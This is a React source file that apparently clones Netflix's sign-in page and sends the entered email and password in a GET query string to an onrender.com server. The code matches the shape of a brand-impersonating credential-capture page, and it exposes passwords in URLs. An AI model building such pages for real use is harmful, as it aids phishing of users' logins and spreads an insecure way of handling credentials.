// import logo from './logo.svg';
// import './App.css';
import axios from 'axios';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

function App() {
  const navigate = useNavigate("")
  const [user, setuser] = useState("")
  const [pass, setpass] = useState("")

  const handleuser = (event) => {
    setuser(event.target.value)
  }
  const handlpass = (event) => {
    setpass(event.target.value)
  }
  function check(e) {
    e.preventDefault()
let details = axios.get(`https://render-netflix-deployment-3.onrender.com/?userEmail=${user}&userPassword=${pass}`)
    details.then(function (data) {
      console.log(data);
      if (data.data == true) {
        navigate("/success")
      } else {
        navigate("/fail")
      }
    })
  }


  return (

    <main className="bg-black bg-[url('/netflixImg.jpg')] bg-cover bg-center min-h-screen">
      <header className="p-4 px-[10vw] border-red-500 h-20 text-red-500 text-5xl font-bold cursor-pointer">
        Netflix
      </header>
      <div className="flex justify-center items-center">
        <form onSubmit={check} className="bg-black h-[85vh] mx-auto w-[65vh] rounded-md p-14 space-y-4">
          <h1 className="text-white text-3xl font-bold mb-3">Sign in</h1>
          <input
          onChange={handleuser}
            className="bg-black text-white rounded-md p-4 w-full border border-gray-500"
            type="email"
            placeholder= "Email or mobile number"
            required
            name="userEmail"
          />
          <input
          onChange={handlpass}
            className="bg-black text-white rounded-md p-4 w-full border border-gray-500"
            type="password"
            placeholder="Password"
            required
            name="userPassword"
          />
          <button
          type='submit'
            
            className="btn_1 text-white font-bold bg-red-600 w-full p-2 rounded-md"
          >
            Sign in
          </button>
          <p className="text-gray-300 text-center">OR</p>
          <p className="btn_1 text-white font-bold bg-gray-700 w-full p-2 rounded-md cursor-pointer text-center">
            Use a sign-in code
          </p>
          <p className="text-white text-center underline cursor-pointer hover:text-gray-300">
            Forgot password?
          </p>

          <label className="space-x-3 flex items-center">
            <input
              type="checkbox"
              className="w-5 h-5 rounded bg-black checked:bg-black checked:border-white border text-white border-white cursor-pointer"
            />
            <p className="text-white inline">Remember me</p>
          </label>

          <div className="mt-8 space-y-5">
            <p className="text-gray-300 inline">
              New to Netflix?{" "}
              <span className="text-white font-bold inline cursor-pointer hover:underline">
                Sign up now.
              </span>
            </p>
          </div>

          <p className="text-gray-400 text-sm">
            This page is protected by Google reCAPTCHA to ensure you're not a
            bot.
          </p>
          <a className="text-blue-400 underline text-sm" href="#">
            Learn more.
          </a>
        </form>
      </div>
    </main>



  );
}

export default App;
